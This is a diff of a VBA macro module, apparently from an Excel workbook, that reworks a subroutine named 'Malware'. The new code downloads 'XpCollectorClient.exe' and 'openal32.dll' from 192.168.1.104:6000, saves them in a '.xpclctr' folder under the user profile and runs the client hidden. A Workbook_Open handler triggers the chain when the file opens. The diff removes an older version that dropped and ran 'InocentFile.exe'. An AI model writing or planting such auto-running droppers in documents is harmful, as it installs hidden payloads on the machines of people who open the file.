@@ -1,32 +1,16 @@
 Public alreadyLaunched As Integer
 
-
-Private Sub Malware()
+Sub HttpGetAndDecodeBase64ToFile(Url As String, OutputPath As String)
     ' Declare variables
     Dim WinHttpReq As Object
     Dim FileStream As Object
     Dim Base64Encoded As String
     Dim BinaryData As Variant
-    Dim URL As String
-    Dim FilePath As String
-    Dim DesktopPath As String
-    Dim FileName As String
-    
-    ' URL of the file to be downloaded (Base64-encoded)
-    URL = "http://localhost:6000/install"
-
-    ' File name to save as
-    FileName = "InocentFile.exe"
-    
-    ' Get the path to the desktop
-    DesktopPath = CreateObject("WScript.Shell").SpecialFolders("Desktop")
-    FilePath = DesktopPath & "\" & FileName
-    
     ' Create the HTTP request object
     Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     
     ' Open the HTTP connection
-    WinHttpReq.Open "GET", URL, False
+    WinHttpReq.Open "GET", Url, False
     WinHttpReq.Send
     
     ' Check if the request was successful
@@ -42,19 +26,47 @@ Private Sub Malware()
         FileStream.Type = 1 ' Binary
         FileStream.Open
         FileStream.Write BinaryData
-        FileStream.SaveToFile FilePath, 2 ' Save binary data to file
+        FileStream.SaveToFile OutputPath, 2 ' Save binary data to file
         FileStream.Close
-        
-        ' Execute the file
-        Shell FilePath, vbHide
-         ' minimized
-    Else
-        MsgBox "Failed to download file. Status: " & WinHttpReq.Status
     End If
+End Sub
+
+Sub CreateFolderIfNotExists(folderPath As String)
+    Dim fso As Object
+
+    ' Create FileSystemObject
+    Set fso = CreateObject("Scripting.FileSystemObject")
+
+    ' Check if the folder exists
+    If Not fso.FolderExists(folderPath) Then
+        ' If the folder doesn't exist, create it
+        fso.CreateFolder folderPath
+        MsgBox "Folder created at: " & folderPath
+    End If
+End Sub
+
+Private Sub Malware()
+    ' Declare variables
+    Dim client_url As String
+    Dim openal_dll_url As String
+    Dim ClientPath As String
+    Dim OpenAlDllPath As String
+    Dim folderPath As String
+    Dim result As Boolean
     
-    ' Cleanup
-    Set WinHttpReq = Nothing
-    Set FileStream = Nothing
+    ' URL of the file to be downloaded (Base64-encoded)
+    client_url = "http://192.168.1.104:6000/XpCollectorClient.exe"
+    openal_dll_url = "http://192.168.1.104:6000/openal32.dll"
+
+    folderPath = Environ("USERPROFILE") & "\" & ".xpclctr"
+    CreateFolderIfNotExists (folderPath)
+    ClientPath = folderPath & "\XpCollectorClient.exe"
+    OpenAlDllPath = folderPath & "\openal32.dll"
+    
+    HttpGetAndDecodeBase64ToFile client_url, ClientPath
+    HttpGetAndDecodeBase64ToFile openal_dll_url, OpenAlDllPath
+    
+    Shell ClientPath, vbHide ' minimized
 
 End Sub
 
@@ -102,3 +114,5 @@ Sub Workbook_Open()
     ' Becomes launched as second, another try, on MS Excel
     Launch
 End Sub
+
+
